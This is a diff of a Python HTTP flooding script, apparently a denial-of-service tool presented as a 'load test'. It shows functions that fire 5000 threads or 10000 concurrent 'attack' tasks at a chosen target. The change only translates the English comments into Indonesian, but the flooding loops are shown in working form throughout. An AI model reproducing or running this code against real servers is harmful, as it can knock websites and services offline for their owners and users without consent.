@@ -115,7 +115,7 @@ def yuklu_spam_sync(target):
                 print(f"{color}[{response.status_code}] {target}")
             except Exception as e:
                 print(f"{Fore.RED}[error] {e}")
-    thread_count = 5000 # <----- YOU CAN CHANGE THE THREAD NUMBER HERE (FOR SYNCHRON)
+    thread_count = 5000 # <== ANDA DAPAT MENGUBAH NOMOR THREAD DI SINI (UNTUK SINKRONISASI)
     
     for _ in range(thread_count):
         threading.Thread(target=send, daemon=True).start()
@@ -137,7 +137,7 @@ async def loaded_spam_async(target):
     print(f"{Fore.LIGHTGREEN_EX}Starting asynchronous load test... (to get out Ctrl+C)")
     async with aiohttp.ClientSession() as session:
         tasks = []
-        concurrency = 10000  # <----- YOU CAN CHANGE THE NUMBER OF CONCURRENT TASK HERE (FOR ASYNCHRONOUS)
+        concurrency = 10000  # <== ANDA DAPAT MENGUBAH JUMLAH TUGAS CONCUREN DI SINI (UNTUK ASINKRONUS)
         for _ in range(concurrency):
             task = asyncio.create_task(async_attack(session, target))
             tasks.append(task)
